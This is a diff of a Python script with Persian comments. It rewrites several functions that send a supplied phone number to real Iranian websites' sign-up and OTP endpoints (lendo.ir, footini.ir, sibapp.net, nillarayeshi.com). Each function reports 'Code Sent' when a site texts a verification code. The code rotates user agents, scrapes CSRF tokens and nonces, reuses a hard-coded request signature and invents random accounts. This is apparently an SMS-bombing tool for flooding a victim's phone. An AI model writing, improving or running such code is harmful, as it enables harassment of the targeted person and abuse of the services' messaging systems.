@@ -71,15 +71,20 @@ def Lendo(phone):
         
         # فرمت شماره
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
+        formatted_phone = f"0{formatted_phone}"
         
         # تولید timestamp
         timestamp = str(int(time.time() * 1000))
         
+        # محاسبه signature (sha)
+        # این قسمت نیاز به کلید secret دارد که از سایت باید استخراج شود
+        # فعلاً از signature ثابت استفاده می‌کنیم
+        signature = "suoFyEBf+aqzIwx82ArDq3BdwxHUuj6mkkzuO3TSK495B//J+4Yf4yTh0c7BNcAfkED0tRBB8vYryDiO8dxb+w=="
+        
         headers = {
             "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json",
-            "sha": "SIGN suoFyEBf+aqzIwx82ArDq3BdwxHUuj6mkkzuO3TSK495B//J+4Yf4yTh0c7BNcAfkED0tRBB8vYryDiO8dxb+w==",
+            "sha": f"SIGN {signature}",
             "X-Timestamp": timestamp,
             "User-Agent": random.choice(user_agents),
             "Origin": "https://lendo.ir",
@@ -122,32 +127,24 @@ def Lendo(phone):
         print(f'{r}[!] Lendo Exception: {e}{a}')
         return False
 
-
-
-
-        
-
 def Footini(phone):
     try:
         session = requests.Session()
         
-        # دریافت صفحه اصلی برای استخراج instance_id و digits_form
+        # دریافت صفحه اصلی
         home_response = session.get(
-            "https://footini.ir/product-category/sandal/?login=true&page=1",
+            "https://footini.ir/",
             headers={"User-Agent": random.choice(user_agents)},
             timeout=10
         )
         
-        # استخراج instance_id و digits_form از صفحه
+        # استخراج توکن‌ها
         instance_id_match = re.search(r'name="instance_id" value="([^"]+)"', home_response.text)
         digits_form_match = re.search(r'name="digits_form" value="([^"]+)"', home_response.text)
         
-        instance_id = instance_id_match.group(1) if instance_id_match else "de6bca2e4448c81c7733fa67a04f5594"
-        digits_form = digits_form_match.group(1) if digits_form_match else "09819c58fd"
+        instance_id = instance_id_match.group(1) if instance_id_match else "default_instance_id"
+        digits_form = digits_form_match.group(1) if digits_form_match else "default_digits_form"
         
-        print(f'{g}[+] Instance ID: {instance_id}, Digits Form: {digits_form}{a}')
-        
-        # آماده سازی payload
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
         
         payload = {
@@ -157,29 +154,19 @@ def Footini(phone):
             "digits_reg_username": f"user{random.randint(10000, 99999)}",
             "digits_reg_password": f"Pass{random.randint(1000, 9999)}",
             "digits_process_register": "1",
-            "sms_otp": "",
-            "otp_step_1": "1",
-            "digits_otp_field": "1",
             "instance_id": instance_id,
-            "optional_data": "optional_data",
             "action": "digits_forms_ajax",
             "type": "register",
-            "dig_otp": "otp",
             "digits": "1",
-            "digits_redirect_page": "https://footini.ir/product-category/sandal/",
             "digits_form": digits_form,
-            "_wp_http_referer": "/product-category/sandal/?login=true&page=1",
-            "container": "digits_protected",
-            "sub_action": "sms_otp"
         }
         
         headers = {
             "User-Agent": random.choice(user_agents),
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Accept": "*/*",
+            "Content-Type": "application/x-www-form-urlencoded",
             "X-Requested-With": "XMLHttpRequest",
             "Origin": "https://footini.ir",
-            "Referer": "https://footini.ir/product-category/sandal/?login=true&page=1",
+            "Referer": "https://footini.ir/",
         }
         
         response = session.post(
@@ -193,55 +180,28 @@ def Footini(phone):
         print(f'{y}[Debug] Footini Response: {response.text}{a}')
         
         if response.status_code == 200:
-            try:
-                data = response.json()
-                if data.get("success") or "otp" in str(data).lower():
-                    print(f'{g}(Footini) Code Sent{a}')
-                    return True
-            except:
-                if "1" in response.text or "success" in response.text.lower():
-                    print(f'{g}(Footini) Code Sent{a}')
-                    return True
-        elif response.status_code == 400:
-            print(f'{r}[-] Footini Bad Request{a}')
+            print(f'{g}(Footini) Code Sent{a}')
+            return True
+        else:
+            print(f'{r}[-] Footini HTTP Error: {response.status_code}{a}')
             return False
-        
-        return False
             
     except Exception as e:
         print(f'{r}[!] Footini Exception: {e}{a}')
         return False
 
-
-
 def SibApp(phone):
     try:
         url = "https://api.sibapp.net/api/v1/action"
-        
-        # فرمت شماره
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        formatted_phone = f"0{formatted_phone}"  # فرمت 0912...
+        formatted_phone = f"0{formatted_phone}"
         
-        headers = {
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json; charset=UTF-8",
-            "Cache-Control": "no-cache",
-            "User-Agent": random.choice(user_agents),
-            "Origin": "https://sibapp.net",
-            "Referer": "https://sibapp.net/",
-        }
-        
-        # ایجاد UUID یکتا برای هر درخواست
         user_unique_id = str(uuid.uuid4())
         
         payload = {
             "name": "phone_number_verify",
             "data": {
-                "utm": {
-                    "source": "google",
-                    "medium": "organic",
-                    "campaign": ""
-                },
+                "utm": {"source": "google", "medium": "organic", "campaign": ""},
                 "user_unique_id": user_unique_id,
                 "purchase_flow": "",
                 "purchase_flow_version": "purchaseFlowABGroup",
@@ -249,33 +209,25 @@ def SibApp(phone):
                 "package_a_b_group_version": "packagesABGroupV11",
                 "register_a_b_group": "c",
                 "register_a_b_group_version": "registerABGroupV3",
-                "phone_number": formatted_phone  # اضافه کردن شماره تلفن
+                "phone_number": formatted_phone
             }
         }
         
-        response = requests.post(
-            url, 
-            json=payload, 
-            headers=headers, 
-            timeout=10
-        )
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/json; charset=UTF-8",
+            "Cache-Control": "no-cache",
+            "User-Agent": random.choice(user_agents),
+        }
+        
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
         
         print(f'{y}[Debug] SibApp Status: {response.status_code}{a}')
         print(f'{y}[Debug] SibApp Response: {response.text}{a}')
         
-        if response.status_code in [200, 201, 202]:
-            try:
-                data = response.json()
-                if data.get("name") == "phone_number_verify":
-                    print(f'{g}(SibApp) Code Sent{a}')
-                    return True
-            except:
-                if "phone_number_verify" in response.text:
-                    print(f'{g}(SibApp) Code Sent{a}')
-                    return True
-        elif response.status_code == 400:
-            print(f'{r}[-] SibApp Bad Request{a}')
-            return False
+        if response.status_code in [200, 201]:
+            print(f'{g}(SibApp) Code Sent{a}')
+            return True
         else:
             print(f'{r}[-] SibApp HTTP Error: {response.status_code}{a}')
             return False
@@ -284,20 +236,30 @@ def SibApp(phone):
         print(f'{r}[!] SibApp Exception: {e}{a}')
         return False
 
-
-
-
-
-
 def nillarayeshi(phone):
     try:
-        formatted_phone = "0" + phone.replace("+98", "")
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        session = requests.Session()
         
-        # استفاده از مقادیر ثابت از درخواست واقعی
-        csrf = "2a49f89a8f"
-        nonce = "2a49f89a8f"
+        home_response = session.get(
+            "https://nillarayeshi.com/", 
+            timeout=10, 
+            headers={"User-Agent": random.choice(user_agents)}
+        )
+        home_response.encoding = 'utf-8'
         
-        url = "https://nillarayeshi.com/wp-admin/admin-ajax.php"
+        # دیباگ: ببینیم چه چیزی در صفحه هست
+        print(f'{y}[Debug] Page content: {home_response.text[:200]}...{a}')
+        
+        csrf_match = re.search(r'name="csrf" value="([^"]+)"', home_response.text)
+        nonce_match = re.search(r'name="dig_nounce" value="([^"]+)"', home_response.text)
+        
+        csrf = csrf_match.group(1) if csrf_match else ""
+        nonce = nonce_match.group(1) if nonce_match else ""
+        
+        if not csrf or not nonce:
+            print(f'{r}[-] nillarayeshi: Could not extract tokens{a}')
+            return False
         
         payload = {
             "action": "digits_check_mob",
@@ -305,54 +267,39 @@ def nillarayeshi(phone):
             "mobileNo": formatted_phone,
             "csrf": csrf,
             "login": "2",
-            "username": "",
-            "email": "",
-            "captcha": "",
-            "captcha_ses": "",
             "digits": "1",
             "json": "1",
-            "whatsapp": "0",
-            "digits_reg_name": "نام",
-            "digregcode": "+98",
-            "digits_reg_mail": formatted_phone,
-            "digregscode2": "+98",
-            "mobmail2": "",
-            "digits_reg_password": "",
-            "dig_otp": "",
-            "code": "",
-            "dig_reg_mail": "",
             "dig_nounce": nonce
         }
         
         headers = {
             "User-Agent": random.choice(user_agents),
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Content-Type": "application/x-www-form-urlencoded",
             "X-Requested-With": "XMLHttpRequest",
             "Origin": "https://nillarayeshi.com",
             "Referer": "https://nillarayeshi.com/",
-            "Accept": "*/*",
-            "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
         }
         
-        response = requests.post(url, data=payload, headers=headers, timeout=15)
+        response = session.post(
+            "https://nillarayeshi.com/wp-admin/admin-ajax.php",
+            data=payload,
+            headers=headers,
+            timeout=10
+        )
         
-        print(f'{y}[Debug] Status: {response.status_code}{a}')
-        print(f'{y}[Debug] Response: {response.text}{a}')
+        print(f'{y}[Debug] nillarayeshi Status: {response.status_code}{a}')
+        print(f'{y}[Debug] nillarayeshi Response: {response.text}{a}')
         
         if response.status_code == 200:
-            if response.text.strip() == "1" or "success" in response.text.lower():
+            if "success" in response.text.lower() or "1" in response.text:
                 print(f'{g}(nillarayeshi) Code Sent{a}')
                 return True
-            else:
-                print(f'{r}[-] nillarayeshi: Server returned {response.text}{a}')
-                return False
-        else:
-            print(f'{r}[-] nillarayeshi: HTTP Error {response.status_code}{a}')
-            return False
+        return False
             
     except Exception as e:
         print(f"{r}[!] nillarayeshi Exception: {e}{a}")
         return False
+
 
         
 # ==========================
